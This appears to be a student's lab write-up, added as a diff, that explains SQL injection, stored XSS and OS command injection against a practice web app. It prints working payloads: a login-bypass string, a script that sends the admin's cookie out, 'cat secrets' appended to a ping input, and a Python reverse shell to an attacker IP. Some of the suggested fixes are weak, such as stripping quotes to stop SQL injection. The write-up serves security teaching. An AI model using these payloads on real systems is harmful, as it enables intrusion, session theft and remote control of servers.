@@ -1,0 +1,65 @@
+5.1 SQL
+The string used for SQL injection:
+alice@alice.com' or 'X'='X
+
+Why it worked:
+If we put " alice@alice.com' or 'X'='X " in the user name field, the resulting SQL query would be like
+"SELECT * FROM users WHERE email='alice@alice.com' or 'X'='X' and password='d14a028c2a3a2bc9476102bb288
+ 234c415a2b01f828ea62ac5b3e42f'", which will always return the row that contain alice's from database
+ regard less of the password we provided because 'X'='X' is always a valid condition therefore the WHERE
+clause will always return the row of alice's record if there is any.
+
+How it can be fixed:
+- Check and process the username and password string from user input. Certain symbols such as "'<space> shall be
+  removed from the string before it is parsed into SQL statements
+- Change the way of validation. Instead of check if there is an record in database with username and password, it can
+  be improved by querying the database with user provided username, and then compare if the password hash matches or
+  not
+- Use other tools such as SQLalchemy, which is object oriented and comes with internal checking mechanism.
+
+
+
+5.2 XSS
+Second Order attack:
+we can update the username to <script> var image = new Image();
+                                        image.src = "http://0.0.0.0:5000/news?text=".concat(document.cookie);
+                              </script>
+and then the javascript will be inside the database. When admin logged in, since the information of all users are
+displayed including alice's username, therefore the javascript will be executed on admin's browser and post admin's
+session ID as an news message.
+
+
+Explain why the first order attack requires the attack code to be injected, and not just em- bedded on a third party
+website:
+Because if the attack code is embedded on a third party website, admin's cookie for the third party website will be
+exposed which is useless information for the attacker.
+
+Explain if you were able to fix the XSS attacks by changing the templates:
+Remove  "|safe" filter from those jinja objects.
+When automatic escaping is enabled, everything is escaped by default except for values explicitly marked as safe.
+Variables and expressions can be marked as safe either in:
+  - the context dictionary by the application with MarkupSafe.Markup, or
+  -the template, with the |safe filter
+If a value is not marked safe, auto-escaping will take place; which means that you could end up with double-escaped
+contents. Double-escaping is easy to avoid, however: just rely on the tools Jinja2 provides and don’t use builtin
+Python constructs such as str.format or the string modulo operator (%).
+
+
+
+5.3 Injection
+Explain which command you used to obtain the content of "secret", and why it works:
+command: google.com; cat secrets
+why it works: Because the server pass the following command directly to the OS,  'ping -c 1 ' + user_input.
+If we let user input be "google.com; cat secrets", the command would be 'ping -c 1 google.com; cat secrets', which is
+equivilant to execute 'ping -c 1 google.com' and 'cat secrets'. The latter command will expose the content stored on
+the server
+
+
+Explain which command you used to obtain the reverse shell, and why it works
+on attacker's computer: $ nc -nvlp 8080
+command on website: google.com; python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);
+                    s.connect(("ATTACKER'S IP ADDRESS",8080));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);
+                    os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
+The attacker firstly use netcat to listen for connection on a specific port. Similar to the previous one, the above
+message is parsed to 'ping -c 1 google.com' and 'python -c "SOME CODE"'. The latter one can establish a TCP connection
+to the attacker and then the attacker can receive a reverse shell.
